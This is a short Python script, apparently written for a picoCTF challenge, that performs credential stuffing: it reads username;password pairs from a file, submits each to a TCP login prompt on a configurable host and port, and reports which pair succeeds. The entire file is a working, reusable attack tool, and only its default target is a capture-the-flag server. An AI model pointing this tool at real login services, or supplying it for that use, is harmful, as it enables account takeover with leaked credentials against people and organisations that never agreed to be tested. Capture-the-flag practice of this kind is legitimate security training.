#!/usr/bin/env python3

"""
Credential Stuffing Tool
Attempts username/password pairs against a TCP login service.

Usage: python3 tool.py
Credential file format: username;password (one per line)

"""

import socket
import sys
import argparse

# argparse

parser = argparse.ArgumentParser(
    description="Credential stuffing tool for TCP login services."
)
parser.add_argument(
    "-H", "--host",
    default="crystal-peak.picoctf.net",
    help="Target host (default: crystal-peak.picoctf.net)"
)
parser.add_argument(
    "-p", "--port",
    type=int,
    required=True,
    help="Target port"
)
parser.add_argument(
    "-f", "--file",
    default="creds.txt",
    help="Credentials file (default: creds.txt)"
)
args = parser.parse_args()
HOST = args.host
PORT = args.port
CRED_FILE = args.file


def receive_until(s, suffix):
    """Guarantees we have read up to a specific prompt (like 'Password:')"""
    data = ""
    while not data.endswith(suffix):
        chunk = s.recv(1024).decode(errors="ignore")
        if not chunk: # wait until server has finished sending
            break
        data += chunk
    return data

def try_pair(usr, pwd):
    try:
        # Timeout to handle network jitter
        s = socket.create_connection((HOST, PORT), timeout=10) 
    except ConnectionRefusedError:
        print(f"\n[!] Connection Refused. Check port {PORT} or instance status.")
        sys.exit()

    # 1. Clear the banner and wait for Username prompt
    receive_until(s, "Username: ")
    s.sendall((usr + "\n").encode())

    # 2. Wait for Password prompt (ensures usr output is cleared)
    receive_until(s, "Password: ")
    s.sendall((pwd + "\n").encode())

    # 3. Capture EVERYTHING sent after the password until the server closes or stops sending
    result = ""
    s.settimeout(2) # Short timeout to stop waiting once server is silent
    try:
        while True:
            chunk = s.recv(4096).decode(errors="ignore")
            if not chunk:
                break
            result += chunk
    except socket.timeout:
        pass # Server finished sending data
    
    s.close()
    return result

def main():

    print(f"\n=================================================\n\n[*] Scanning {HOST}:{PORT}...\n")
    
    try:
        with open(CRED_FILE, 'r', encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or ";" not in line:
                    continue
                
                usr, pwd = line.split(";", 1)
                result = try_pair(usr, pwd)

                # Now 'result' only contains what happened AFTER the password
                if "Invalid" not in result and result.strip():
                    print(f"[+] Success! {usr};{pwd}")
                    print(f"[+] Server Response:{result.strip()}")

                    break # Uncomment to stop at first success
                else:
                    print(f"[-] Failed: {usr}")
                    print(f"[-] Server Response: {result.strip()}\n")


    except FileNotFoundError:
        print(f"[!] File {CRED_FILE} not found.")

if __name__ == "__main__":
    main()
